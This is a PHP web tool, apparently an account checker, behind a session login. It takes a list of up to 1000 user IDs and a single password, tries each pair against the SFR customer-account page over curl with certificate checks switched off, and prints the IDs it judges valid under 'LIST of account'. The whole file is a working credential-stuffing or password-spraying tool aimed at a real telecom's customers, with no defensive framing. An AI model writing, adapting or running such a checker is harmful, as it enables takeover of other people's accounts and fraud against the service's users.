<?php
session_start();

  if ((isset($_SESSION['user']) AND isset($_SESSION['pass'])) || (isset($_SESSION['user_check']) AND isset($_SESSION['pass_check'])))

 {
 ?>
  <link rel="stylesheet" href="css/example.css">
 <?php
	if(!empty($_REQUEST['id'])&& isset($_REQUEST['id'])&& !empty($_REQUEST['password'])&& isset($_REQUEST['password']))//&& is_numeric ($_POST['imei']))

				{

					require("header.php");
					$pass=$_REQUEST['password'];
					$i=0;
					$tab_ok=array();
					$tab_err=array();
					$texte = $_REQUEST['id'];
					$tab_lignes = explode("\n",$texte);
					$tab_lignes = array_map('trim',$tab_lignes);// Enl�ve les espaces vides
					$tab_lignes = array_filter($tab_lignes);// Supprime les �l�ments vides (= lignes vides)
					$ligne = array_slice($tab_lignes,0,1000);// S�lectionne les 15 premiers �l�ments du tableau (soit les 15 premi�res lignes non vides)
					
					
					
					foreach( $ligne as $row => $id ) 

							{	$i++;	
								
									$url="https://www.sfr.fr/sfr-et-moi.html#sfrintid=V_head_deco";
	
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, $id.":".$pass);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($ch);
   
        
		
		$pos = 0;
// $pos = strpos($result, "Bad credentials");

	// if($pos > 0)
		// {
			// echo'<font color="red">'.$user.'</font><br>';
		// }
		
		
		
		 if ( $error = curl_error($ch) )
	
		 echo 'ERROR: ';

		curl_close($ch); 

	if (strpos($result, "false") !== false)
		{
		
			$tab_ok[$i]='<font color="green">'.$id.'</font>';
			
		}
		else
		{
				$tab_err[$i]='<font color="red">'.$id.'</font>';
		}
						
						
						
						
						
							}
							
							
echo'<center>';							
if($tab_ok)
{
// echo '###########################<br>';
echo 'LIST of account<br><br>';
// echo '###########################<br>';
foreach( $tab_ok as $row => $imei ) 
{

echo $imei.'<br>';
}
}

if($tab_err)
{

foreach( $tab_err as $row => $imei ) 
{

echo $imei.'<br>';
}
}
							
echo'</center>';								
							
}
else
{
echo '<script>alert("svp remplir le champs imei")</script>';

print("<script type=\"text/javascript\">setTimeout('location=(\"accueil.php\")' ,0);</script>");
}
}
else
{

print("<script type=\"text/javascript\">setTimeout('location=(\"login.php\")' ,0);</script>");

}
?>